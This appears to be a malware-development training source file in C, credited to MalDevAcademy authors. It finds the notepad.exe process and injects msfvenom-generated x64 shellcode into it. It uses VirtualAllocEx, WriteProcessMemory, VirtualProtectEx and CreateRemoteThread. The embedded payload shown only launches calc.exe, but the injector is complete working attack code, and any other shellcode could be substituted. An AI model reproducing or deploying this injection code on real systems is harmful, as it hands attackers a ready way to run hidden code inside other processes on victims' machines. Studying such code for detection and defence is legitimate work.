// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)

#define TARGET_PROCESS L"notepad.exe"


// msfvenom -a x64 --platform windows -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
// .data saved payload
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {

	DWORD   adwProcesses[1024 * 2], // Buffer pour stocker les PIDs retournés par EnumProcesses
		dwReturnLen1 = 0,
		dwReturnLen2 = 0,// Deux variables pour stocker les tailles retournées par EnumProcesses et EnumProcessModules
		dwNmbrOfPids = 0; // Buffer pour stocker le nombre de PIDs retournés par EnumProcesses

	HANDLE  hProcess = NULL; // Handle temporaire pour chaque processus ouvert lors de l'itération
	HMODULE hModule = NULL; // Un seul module suffit pour récupérer le nom du processus (le module de base)
	WCHAR   szProc[MAX_PATH]; // Buffer pour stocker le nom du processus récupéré

    *pdwPid = 0;
    *phProcess = NULL;

    if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
        error("EnumProcesses Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);
    info("Number Of Processes Detected : %d", dwNmbrOfPids);

    for (DWORD i = 0; i < dwNmbrOfPids; i++) {

        if (adwProcesses[i] != 0) {

            // ouvrir le processus et obtenir un handle
            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, adwProcesses[i]);
            if (hProcess != NULL) {

				// lister les modules du processus pour récupérer le module de base (le processus lui-même)
                if (EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {

                    // on récupère le nom
                    if (GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {

                        // on regarde si c'est la target
                        if (wcscmp(szProcName, szProc) == 0) {
                            *pdwPid = adwProcesses[i];
                            *phProcess = hProcess;

							// closing the handle here because we will open it again with the right access rights for injection later
                            CloseHandle(hProcess);

							// open the process again with the right access rights for injection
                            *phProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, adwProcesses[i]);

                            // error check
                            if (*phProcess == NULL) {
                                error("Failed to re-open target process with injection rights. Error: %d", GetLastError());
                                return FALSE;
                            }

                            return TRUE;
                        }
						else {
							// list all running processes with their PIDs until we find the target process
							info("Process \"%ls\" Detected With PID : %d \n", szProc, adwProcesses[i]);
						}
                    }
                }

                //si c'est pas la cible alors on ferme le handle et on continue
                CloseHandle(hProcess);
            }
        }
    }

    return FALSE;
}


BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeofShellcode) {

    DWORD	dwOldProtection = NULL;
    PVOID	pShellcodeAddress = NULL;
    SIZE_T	sNumberOfBytesWritten = NULL;


    // Read Write permissions
    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        error("VirtualAllocEx Failed With Error : %d \n", GetLastError());
    }




    info("pAddress Allocated At : 0x%p using VirtualAllocEx Of Size : %d with RW permissions\n", pShellcodeAddress, sSizeofShellcode);
    info("Press <Enter> To Write ... ");
    getchar();



	// Write the shellcode to the allocated memory in the remote process
    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeofShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeofShellcode) {
        printf("WriteProcessMemory Failed With Error : %d \n", GetLastError());
    }

	// Change the memory protection to RX to allow execution of the shellcode
    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeofShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("Successfully written %d bytes, Press <Enter>\n", sNumberOfBytesWritten);
    getchar();



    printf("Executing the shellcode in the remote process using CreateRemoteThread\n");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);	if (hThread == NULL) {
        printf("CreateRemoteThread Failed With Error : %d \n", GetLastError());
    }
    printf("Thread created with ID: %lu\n", GetThreadId(hThread));
    printf("DONE !\n");
    if (hThread) {
        CloseHandle(hThread);
    }
    return TRUE;

}



int main() {

	DWORD		Pid = NULL;
	HANDLE		hProcess = NULL;

	if (!GetRemoteProcessHandle(TARGET_PROCESS, &Pid, &hProcess)) {
		return -1;
	}

	wprintf(L"FOUND \"%s\" - Of Pid : %d \n", TARGET_PROCESS, Pid);


	info("Press <Enter> To Inject The Shellcode ... ");
    getchar();
    if (!InjectShellcodeToRemoteProcess(hProcess, shellcode, sizeof(shellcode))) {
        return -1;
    }

  

	info("Press <Enter> To Quit ... ");
	getchar();

	return 0;
}

